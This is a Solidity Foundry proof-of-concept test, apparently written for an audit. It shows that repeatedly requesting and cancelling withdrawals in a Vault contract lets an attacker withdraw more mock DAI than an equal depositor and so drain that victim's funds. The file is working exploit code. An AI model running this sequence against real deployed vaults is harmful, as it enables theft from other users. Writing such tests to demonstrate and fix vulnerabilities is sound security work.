// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {BaseTest} from "./helpers/BaseTest.sol";
import {MockERC20} from "src/mocks/MockERC20.sol";
import {Vault} from "src/Vault/Vault.sol";
import {IVault} from "src/interfaces/IVault.sol";

contract PlantPoC is BaseTest {
    Vault internal vault;
    MockERC20 internal dai;

    address internal attacker;
    address internal victim;

    function setUp() public override {
        super.setUp();
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");

        dai = deployMockToken("DAI", 18);

        vm.prank(owner);
        vault = new Vault(feeRecipient, 0, 500, 100);

        vm.prank(owner);
        vault.addAsset(address(dai));

        mintAndApprove(dai, victim, address(vault), 1_000_000 ether);
        mintAndApprove(dai, attacker, address(vault), 1_000_000 ether);
    }

    function test_exploit_drains_user_funds() public {
        vm.prank(victim);
        vault.deposit(address(dai), 100_000 ether, victim);

        vm.prank(attacker);
        vault.deposit(address(dai), 100_000 ether, attacker);

        advanceSeconds(180 days);

        for (uint256 i = 0; i < 5; i++) {
            uint256 shares = vault.userShares(attacker);
            vm.prank(attacker);
            vault.requestWithdraw(shares, address(dai));
            vm.prank(attacker);
            vault.cancelWithdraw();
            advanceSeconds(60 days);
        }

        uint256 attackerShares = vault.userShares(attacker);
        uint256 victimShares = vault.userShares(victim);

        vm.prank(attacker);
        vault.requestWithdraw(attackerShares, address(dai));
        vm.prank(victim);
        vault.requestWithdraw(victimShares, address(dai));

        advanceBlocks(101);

        vm.prank(attacker);
        uint256 attackerOut = vault.claimWithdraw();
        vm.prank(victim);
        uint256 victimOut = vault.claimWithdraw();

        assertGt(attackerOut, victimOut, "CRITICAL: attacker stole from victim");
        emit log_named_uint("Attacker withdrew (DAI)", attackerOut);
        emit log_named_uint("Victim withdrew (DAI)", victimOut);
        emit log_named_uint("Stolen", attackerOut - victimOut);
    }
}
